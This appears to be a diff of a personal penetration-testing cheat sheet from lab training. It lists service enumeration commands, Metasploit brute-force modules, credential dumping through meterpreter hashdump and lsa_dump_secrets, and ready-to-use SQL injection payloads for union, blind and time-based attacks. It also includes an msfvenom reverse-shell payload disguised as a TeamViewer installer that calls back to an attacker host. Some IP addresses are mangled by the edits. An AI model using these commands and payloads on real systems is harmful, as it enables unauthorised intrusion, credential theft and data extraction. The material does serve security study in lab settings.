@@ -1,10 +1,10 @@
-$ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
+$ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.1..248
 
 DNS ENUM
 
 bruteforce for fqdn
 
-dnsenum --dnsserver 10.129.42.195 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/namelist.txt dev.inlanefreight.htb
+dnsenum --dnsserver 10.19.4.195 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/namelist.txt dev.inlanefreight.htb
 
 dig AXFR internal.inlanefreight.htb @STMIP
 
@@ -24,60 +24,318 @@ ssh -i id_rsa ceil@STMIP
 
 dig ANY inlanefreight.htb @STMIP
 
-SMB:
+--- SMB:
 
-smbclient -N -L //10.129.14.128
+smbclient -N -L //10.1.1.128
 smbclient //10.129.14.128/notes
 smb: \> get prep-prod.txt
 
-rpcclient -U "" 10.129.14.128
+rpcclient -U "" 10.9.1.128
 
 Samrdump.py /SMBmap
 
-NFS
+--- NFS ---
 
-$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
+$ sudo nmap --script nfs* 10.1.1.128 -sV -p111,2049
 
-showmount -e 10.129.14.128
+showmount -e 10.1.1.128
 
 $ mkdir target-NFS
-$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
+$ sudo mount -t nfs 10.1.1.128:/ ./target-NFS/ -o nolock
 $ cd target-NFS
 $ tree .
 
-SMTP
+--- SMTP
 
-$ telnet 10.129.14.128 25
+$ telnet 10.1.1.128 25
 VRFY root
-$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
+$ sudo nmap 10.1.1.128 -p25 --script smtp-open-relay -v
 
 wget https://academy.hackthebox.com/storage/resources/Footprinting-wordlist.zip
 
-smtp-
+-- smtp-
 smtp-user-enum -M VRFY -U ./footprinting-wordlist.txt -t STMIP -m 60 -w 20
 
-snmp-
-onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
-snmpwalk -v2c -c public(community string from onesixtyone) 10.129.14.128
+-- snmp---
+onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.1.1.128
+snmpwalk -v2c -c public(community string from onesixtyone) 10.1.1.128
 
-curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
+curl -k 'imaps://10.1.1.128' --user cry0l1t3:1234 -v
 
 telnet STMIP 110
 
-imap 
-openssl s_client -connect 10.129.111.82:imaps
+-- imap --
+openssl s_client -connect 10.1.1.82:imaps
 tag0 LOGIN robin robin
 tag1 LIST "" "*"
 tag2 SELECT "DEV.DEPARTMENT.INT"
 tag3 FETCH 1 (BODY[])
 
-mysql:
+-- mysql--
 
 mysql -u <user> -p<password> -h <IP address>
 
-sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.1.q.248
 
-$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
+$ python3 mssqlclient.py Administrator@10.1.1.248 -windows-auth
 
 hashcat -m 7300 -w 3 -O "93c887ae8200000052f17511d0fd3b9a08350b045e118a2cd0c311777576080bc13a5581d522cdb5a123456789abcdefa123456789abcdef140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8" /usr/share/wordlists/rockyou.txt
 
+---Stegno --
+exiftool <filepath>
+
+snow -C -m "My sketchy wallet: 3FkenCiXpSLqD8L79intRNXUgjRoH9sjXy" -p "pa55" readme.txt readme2.txt
+
+snow -C -p "pa55" readme2.txt
+
+CyberChef  with ROT13
+
+QuickStego, openstego, Steghide
+
+steghide embed -cf black-cat.jpg -ef secret-text.txt
+
+steghide extract -sf <filepath>
+
+steghide info black-cat.jpg
+
+Directory Scanner (dir_scanner)
+The module auxiliary/scanner/http/dir_scanner scans one host or a complete network range for any interesting directories in a directory path.
+
+Once you've started msfconsole, you can use the module and view its options.
+
+Following what you learned in the previous lab, you know to set RHOSTS to the single or range of IP targets.
+But once you know which ports are open, you can also set the RPORT field to target a specific port of an IP address.
+
+msf > auxiliary/scanner/http/dir_scanner
+msf auxiliary(dir_scanner) > set RHOSTS [IP address]
+RHOSTS => [IP address]
+msf auxiliary(dir_scanner) > set RPORT [port]
+RPORT => [port]
+msf auxiliary(dir_scanner) > run
+===========================================
+Tomcat MGR Login
+Try and log in to a Tomcat Manager Application instance by brute forcing with a uname and pswd combination list.
+using module auxiliary/scanner/http/tomcat_mgr_login.
+
+Here, if you keep the default username and password files, set the fields RHOSTS and RPORT to the target, and run the command,
+any successful default sets of Tomcat credentials will appear in the output.
+
+You can also give this module a directory path to a text file of username and password combinations in the field USERPASS_FILE.
+This module will then attempt to brute force log in on target machines rather than the default options.
+=============================================
+SMB Login Check
+Alternatively, if you have a valid username and password combination, a Metasploit scan can reveal access information.
+The SMB Login Check Scanner connects to various hosts to determine where the username and password can gain you access on target machines.
+
+msf > use auxiliary/scanner/smb/smb_login
+
+This versatile module has many options. Decide which options to use and edit them to match your goals.
+
+Enter the username and password you want to test against your target IP address(es).
+
+msf auxiliary(smb_login) > set RHOSTS [IP]
+RHOSTS => [IPs] 
+msf auxiliary(smb_login) > set SMBUser [username]
+SMBUser => [username]
+msf auxiliary(smb_login) > set SMBPass [password]
+SMBPass => [password]
+msf auxiliary(smb_login) > set THREADS [number of threads]
+THREADS => [number of threads]
+msf auxiliary(smb_login) > run
+
+Like the Tomcat MGR Login module, this module can also be given a list of usernames and passwords to brute force the login on target machines.
+
+Here are some example text files containing usernames and passwords:
+
+Usernames.txt: User, Admin, Administrator, Guest, Default, [USER]
+Passwords.txt: Password, ChangeMe, Guest, 12345, Admin, [PASSWORD]
+
+Check the content against the target system by checking for the fields USER_FILE and PASS_FILE and set the options accordingly.
+
+msf auxiliary(smb_login) > set USER_FILE /root/users.txt
+msf auxiliary(smb_login) > set PASS_FILE /root/passwords.txt
+
+Msfconsole will generate a list of usernames and passwords that it detects.
+
+It's worth noting that this scan will show as a failed login attempt in the event log of each Windows box it scans.
+This is a loud method of scanning as it can be traced, a contrast to the scanner/portscan/syn module we previously looked at.
+
+======================================
+service postgresql start
+
+service postgresql status
+
+sudo systemctl start postgresql
+
+(Please note that other guides may use the systemctl command to set up the database, but this method is not available in our lab.)
+
+Once PostgreSQL has been started, we need to initialize the data with msfdb init.
+
+msfdb init
+
+sudo msfdb status
+
+sudo msfdb run
+
+After we have initialized our msfconsole database, we can start Metasploit by running the command msfconsole.
+
+To verify that Metasploit is connected to the database correctly, we can use the command db_status to verify the connection.
+
+msf > db_status
+
+msf6 > workspace
+
+msf6 > workspace -a Target_1
+
+msf6 > db_nmap -sV -sS 10.10.10.8
+=================
+
+[!bash!]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
+
+===========
+meterpreter > hashdump
+
+meterpreter > lsa_dump_sam
+
+meterpreter > lsa_dump_secrets
+
+=================
+
+$ john --format=sha256 hashes_to_crack.txt
+
+$ john --wordlist=<wordlist_file> --rules <hash_file>
+==============
+Basic scan
+---------------------
+wpscan [OPTIONS] --url [IP Address/URL] --no-update
+---------------------
+User enumeration
+---------------------
+Using the -e u or --enumerate u option, WPScan can generate a list of usernames.
+wpscan -e u --url [IP Address/URL] --no-update
+---------------------
+Plugin scan
+---------------------
+Using the -e p or --enumerate p option, WPScan will look for installed plugins and attempt to get their version number.
+The default option is to only scan for common plugins that have a vulnerability.You can override this with the -e ap option.
+If you are using Version 3.x, you can also change the method used for detection using the --plugins-detection aggressive option.
+wpscan -e p --url [IP Address/URL] --no-update
+wpscan --url [IP address/RUL] --enumerate ap --plugins-detection aggressive --no-update
+---------------------
+Themes enumeration
+---------------------
+Using the -e t or --enumerate t option, WPScan will look for installed themes and list any vulnerabilities that it finds.
+wpscan -e t --url [IP Address/URL] --no-update
+---------------------
+Brute force
+---------------------
+You can use WPScan to iterate over a password list and try to guess a user’s password via the --passwords option, passing it a wordlist of your choice.
+There are many preset wordlists for Kali users in the /usr/share/wordlists/ directory.
+wpscan --url [IP Address/URL] --passwords passwords.txt --no-update
+wpscan --url [IP Address/URL] --usernames <specify username> --passwords passwords.txt --no-update
+---------------------
+Note-
+Make sure to include the --no-update tag when performing a scan with WPScan to avoid updating the database.
+For the brute force scan, you will need to use the namelist.txt wordlist found in the /usr/share/wordlists/metasploit directory.
+===================
+
+Gobuster -
+gobuster -u http://fakebank.com -w wordlist.txt dir
+
+' ORDER BY 5 #
+input' UNION SELECT 1,2,3,4,5 #
+@@version - shows the version of MySQL.
+ version() - shows the version of MySQL.
+ database() - shows the name of the database.
+ user() - shows the current DB user
+UNION SELECT 1,group_concat(table_name, 0x0a),3 FROM information_schema.tables WHERE table_schema = database()
+1' UNION SELECT 1,group_concat(column_name, 0x0a),3 FROM information_schema.columns WHERE table_name = [0xhex value of table name]
+input' UNION SELECT 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=0x63726561746f7273 #
+union select 1,2,3,4,5,6,7,8,9,10,group_concat(username,subscriber) from users
+(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)
+
+' AND (length(database())) = 8 --+
+' AND (ascii(substr((select database()),1,1))) > 120
+' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 --+
+?id=1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) > 120 --+
+' OR (length((select column_name from information_schema.columns WHERE table_name = 'data' limit 0,1))) > '5
+' OR (ascii(substr((select column_name from information_schema.columns WHERE table_name = 'data' limit 0,1) ,1,1))) > '120
+' OR (length((select secret from data limit 0,1))) > 4
+' OR (ascii(substr((select secret from data),1,1))) > 100
+
+tst'+OR+IF(LENGTH(DATABASE())=15,SLEEP(5),"NO")+AND+'1'='1
+tst'+OR+IF(length((select column_name from information_schema.columns WHERE table_name = 'trophy'))=15,SLEEP(5),"NO")+AND+'1'='1
+
+sqlmap -u 'http://www.somewebsite.com/select.php?id=123'
+$ sqlmap.py -u “<URL>” --data=“id=1” --banner
+$ sqlmap.py -u “<URL>” --batch --password
+$ sqlmap.py -u “<URL>” --batch --dbs
+$ sqlmap.py -u “<URL>” --batch --tables -D <DATABASE>
+$ sqlmap.py -u “<URL>” --batch --dump -T <TABLE> -D <DATABASE>
+
+Step 1: id=1' 
+Step1 : id=-1
+Step 2: id=1'+order+by+1 -- enumerate col
+Step 3 : id=1'+union+select1,2,3 -- vulnerable col
+Step 4: id=1'+union+select1,'a',3 -- identify data type
+'+union+select+username,password+from+users--+
+' union select null,username || password from users--
+Step 4 : url/listing.php?id=1 union select 1,2,database() --+                                                ***databasename**
+Step 5 : /listing.php?id=1 union select 1,2,table_name from information_schema.tables --+   ***tablename**
+Step 6 : listing.php?id=1 union select 1,2,column_name from information_schema.columns where table_name=”tblusers” --+  ***extract col names from table**
+Step 7 : /listing.php?id=1 union select 1,2,group_concat(UserId,0x0a,UserName,0x0a,UserPwd) from tblusers --+ ***Extracting UserId,UserName,UserPwd**
+
+https://aca01f691e6f0ee3c0d52e0200b80030.web-security-academy.net/filter?category=Pets%27+union+select+null,null--
+
+<script>alert('l33t')</script>
+
+("(&(cn=" + username +")(userPassword=" + pass +"))")
+
+=======================
+sudo nmap -Pn -O -sV [IP Address]
+
+sudo nmap -Pn -O --osscan-guess [IP Address]
+
+find / -name "*nse" 2>/dev/null
+
+find / -name "*http*.nse" 2>/dev/null
+
+nmap --script http-wordpress-brute.nse --script-args ‘passdb=passwords.txt’ [IP ADDRESS]
+
+nmap --script-help http-sql-injection.nse
+
+nmap [IP ADDRESS] --script ssh-run --script-args="ssh-run.cmd=[COMMAND],username=<USERNAME>, password=<PASSWORD>"
+
+nmap 10.102.0.113 --script ssh-auth-methods.nse --script-args="username=tommy,password=coachella"
+
+knock [target IP address] [first port] [second port] [third port]
+
+==========================================
+Droopescan
+------------------
+Droopescan is the oldest of the two scanners and receives occasional updates.
+It has also been updated to scan other CMS platforms like WordPress and Joomla.
+--------------------
+scan 
+--------------------
+will run a series of automated scans to look for known modules and themes.
+droopescan scan drupal -u http://<TARGET_IP>
+--------------------
+stats
+--------------------
+shows which versions exist for each CMS and how many checks are made.
+droopescan stats
+--------------------
+Drupwn
+--------------------
+Drupwn is a relatively new scanner that cannot perform as many module detection searches as droopescan.
+However, it does have several other useful features like ‘User Detection’, ‘Default File Detection’ and a CVE scanner or exploit module; 
+python3 drupwn enum http://<TARGET_IP>
+--------------------
+if you only wanted to carry out user detection you would do so with the following command:
+python3 drupwn enum http://<TARGET_IP> --users
+--------------------
+Note
+-----
+You will need to run Drupwn from the directory where the file is located.
+This can be done by running cd drupwn before entering the example command shown above.
